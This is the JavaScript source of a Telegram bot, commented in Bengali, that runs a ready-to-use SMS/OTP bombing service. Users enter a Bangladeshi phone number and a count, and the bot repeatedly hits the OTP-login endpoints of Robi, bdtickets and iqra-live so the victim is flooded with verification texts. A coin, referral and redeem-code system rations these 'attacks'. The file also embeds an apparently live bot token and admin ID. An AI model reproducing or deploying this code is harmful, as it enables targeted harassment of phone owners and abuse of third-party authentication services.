const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস হ্যান্ডলিং
const dbFile = 'users.json';
const configFile = 'config.json';
if (!fs.existsSync(dbFile)) fs.writeFileSync(dbFile, JSON.stringify({}));
if (!fs.existsSync(configFile)) fs.writeFileSync(configFile, JSON.stringify({ redeemCode: null, reward: 0, limit: 0, usedBy: [] }));

let users = JSON.parse(fs.readFileSync(dbFile));
let config = JSON.parse(fs.readFileSync(configFile));
let activeAttacks = {}; 

function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }
function saveConfig() { fs.writeFileSync(configFile, JSON.stringify(config, null, 2)); }

// Render Uptime সার্ভার
http.createServer((req, res) => { res.write("S.R.M Engine Live!"); res.end(); }).listen(process.env.PORT || 3000);

// কিবোর্ড মেনুসমূহ
function getMenu(userId) {
    const isAdmin = (userId === adminId);
    let keyboard = [
        [{ text: '🚀 শুরু করুন (Attack)' }, { text: '👤 প্রোফাইল ও ব্যালেন্স' }],
        [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
        [{ text: '🎫 রিডিম কোড (Redeem)' }, { text: '📢 অফিশিয়াল চ্যানেল' }]
    ];
    if (isAdmin) keyboard.splice(2, 0, [{ text: '🧧 কয়েন গিফট (Admin Only)' }]);
    return { reply_markup: { keyboard: keyboard, resize_keyboard: true } };
}

const backKeyboard = { reply_markup: { keyboard: [[{ text: '🔙 ফিরে যান' }]], resize_keyboard: true } };

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    // ইউজার রেজিস্ট্রেশন
    if (!users[userId]) {
        users[userId] = { 
            balance: (userId === adminId) ? 9999999999 : 0, 
            lastBonus: 0, step: '', name: msg.from.first_name || "User", isBanned: false 
        };
        saveDB();
    }

    // ১. ব্যাক বাটন ও স্টপ লজিক
    if (text === '🔙 ফিরে যান') {
        users[userId].step = ''; saveDB();
        return bot.sendMessage(chatId, "🏠 মেইন মেনুতে ফিরে আসা হয়েছে।", getMenu(userId));
    }
    if (text === '🛑 Stop Attack') {
        if (activeAttacks[userId]) {
            activeAttacks[userId] = false;
            return bot.sendMessage(chatId, "🛑 অ্যাটাক বন্ধ করা হচ্ছে...", getMenu(userId));
        }
    }

    // ২. অ্যাডমিন কমান্ডস
    if (userId === adminId) {
        if (text === '/userlist') {
            let list = `📊 **S.R.M User List:**\n\n`;
            let keys = Object.keys(users);
            keys.slice(-20).forEach((id, i) => { list += `${i+1}. ${users[id].name} - \`${id}\` - 💰 ${users[id].balance}\n`; });
            return bot.sendMessage(chatId, list, { parse_mode: "Markdown" });
        }
        if (text.startsWith('broadcast ')) {
            const bMsg = text.replace('broadcast ', '');
            Object.keys(users).forEach(id => bot.sendMessage(id, `📢 **S.R.M Update**\n\n${bMsg}`).catch(e=>{}));
            return bot.sendMessage(chatId, "✅ ব্রডকাস্ট সম্পন্ন।");
        }
        if (text.startsWith('setcode ')) {
            const [_, code, rew, lim] = text.split(' ');
            config.redeemCode = code; config.reward = parseInt(rew); config.limit = parseInt(lim); config.usedBy = [];
            saveConfig(); return bot.sendMessage(chatId, `✅ কোড ${code} সেট হয়েছে।`);
        }
    }

    // ৩. স্টার্ট ও মেনু লজিক
    if (text === '/start' || text.startsWith('/start')) {
        const joined = await isSubscribed(chatId);
        if (!joined) return bot.sendMessage(chatId, `❌ জয়েন করে /start দিন।\n${channelLink}`, { reply_markup: { inline_keyboard: [[{ text: '📢 জয়েন করুন', url: channelLink }]] } });
        
        if (text.startsWith('/start ') && text.split(' ')[1] !== userId && !users[userId].referredBy) {
            const rId = text.split(' ')[1];
            if (users[rId]) { users[rId].balance += 5; users[userId].referredBy = rId; saveDB(); bot.sendMessage(rId, "🎊 রেফার বোনাস +৫ কয়েন!"); }
        }
        users[userId].step = ''; saveDB();
        return bot.sendMessage(chatId, `⚡ **S.R.M TELECOM** 👋\n💰 ব্যালেন্স: **${users[userId].balance} Coins**`, getMenu(userId));
    }

    if (text === '👤 প্রোফাইল ও ব্যালেন্স') {
        return bot.sendMessage(chatId, `👤 নাম: ${users[userId].name}\n🆔 ID: \`${userId}\`\n💰 ব্যালেন্স: ${users[userId].balance} Coins`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর আবার ট্রাই করুন।");
        users[userId].balance += 2; users[userId].lastBonus = now; saveDB();
        return bot.sendMessage(chatId, "✅ ২ কয়েন বোনাস পেয়েছেন।");
    }

    if (text === '🔗 রেফার করুন') {
        const me = await bot.getMe();
        return bot.sendMessage(chatId, `🔗 রেফার লিংক:\nhttps://t.me/${me.username}?start=${userId}\n\nপ্রতি রেফারে ৫ কয়েন!`);
    }

    // ৪. অ্যাটাক ইঞ্জিন (10s Gap + Back Button)
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ কয়েন নেই!");
        users[userId].step = 'num'; saveDB();
        return bot.sendMessage(chatId, "📱 নম্বর দিন (১১ ডিজিট):", backKeyboard);
    }

    if (users[userId]?.step === 'num' && text.length === 11) {
        users[userId].target = text; users[userId].step = 'amount'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS? (১-৩০):", backKeyboard);
    }

    if (users[userId]?.step === 'amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ ১-৩০ এর মধ্যে সংখ্যা দিন।", backKeyboard);
        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = ''; saveDB();

        activeAttacks[userId] = true;
        bot.sendMessage(chatId, `🚀 **${target}** অ্যাটাক শুরু...`, { reply_markup: { keyboard: [[{ text: '🛑 Stop Attack' }]], resize_keyboard: true } });

        let success = 0;
        for (let i = 0; i < amount; i++) {
            if (!activeAttacks[userId]) break;
            try { await axios.post('https://www.robi.com.bd/api/v1/user/otp-login/request', [{"msisdn": target}], { headers: { 'Accept': 'text/x-component', 'next-action': '7f059ca75e4421bcef70abad89cb5bb05cba717c30', 'X-Requested-With': 'mark.via.gp' }, timeout: 4000 }); success++; } catch (e) {}
            try { await axios.post('https://api.bdtickets.com:20100/v1/auth', { "createUserCheck": true, "phoneNumber": "+88" + target, "applicationChannel": "WEB_APP" }, { headers: { 'Content-Type': 'application/json', 'Origin': 'https://bdtickets.com' }, timeout: 5000 }); success++; } catch (e) {}
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); success++; } catch (e) {}
            await new Promise(r => setTimeout(r, 10000)); // ১০ সেকেন্ড বিরতি
        }
        delete activeAttacks[userId];
        bot.sendMessage(chatId, `✅ সম্পন্ন! সফল: ${success}`, getMenu(userId));
    }

    // ৫. রিডিম ও গিফট
    if (text === '🎫 রিডিম কোড (Redeem)') {
        if (!config.redeemCode) return bot.sendMessage(chatId, "❌ কোড নেই।");
        users[userId].step = 'redeem_input'; saveDB();
        return bot.sendMessage(chatId, "🎫 কোড লিখুন:", backKeyboard);
    }
    if (users[userId]?.step === 'redeem_input') {
        if (text === config.redeemCode) {
            if (config.usedBy.includes(userId)) return bot.sendMessage(chatId, "❌ অলরেডি নিয়েছেন।", getMenu(userId));
            users[userId].balance += config.reward; config.usedBy.push(userId);
            users[userId].step = ''; saveDB(); saveConfig();
            return bot.sendMessage(chatId, `✅ ${config.reward} কয়েন পেয়েছেন।`, getMenu(userId));
        } else { users[userId].step = ''; saveDB(); return bot.sendMessage(chatId, "❌ ভুল কোড।", getMenu(userId)); }
    }

    if (text === '🧧 কয়েন গিফট (Admin Only)' && userId === adminId) {
        users[userId].step = 'gift_id'; saveDB();
        return bot.sendMessage(chatId, "🆔 ইউজারের ID দিন:", backKeyboard);
    }
    if (users[userId]?.step === 'gift_id' && userId === adminId) {
        if (!users[text]) return bot.sendMessage(chatId, "❌ ইউজার নেই।", backKeyboard);
        users[userId].gift_to = text; users[userId].step = 'gift_amt'; saveDB();
        return bot.sendMessage(chatId, "🔢 কয়েন পরিমাণ?", backKeyboard);
    }
    if (users[userId]?.step === 'gift_amt' && userId === adminId) {
        const amt = parseInt(text);
        users[users[userId].gift_to].balance += amt;
        users[userId].step = ''; saveDB();
        bot.sendMessage(chatId, `✅ পাঠানো হয়েছে।`, getMenu(userId));
        bot.sendMessage(users[userId].gift_to, `🎁 অ্যাডমিন আপনাকে ${amt} কয়েন দিয়েছেন।`);
    }
});
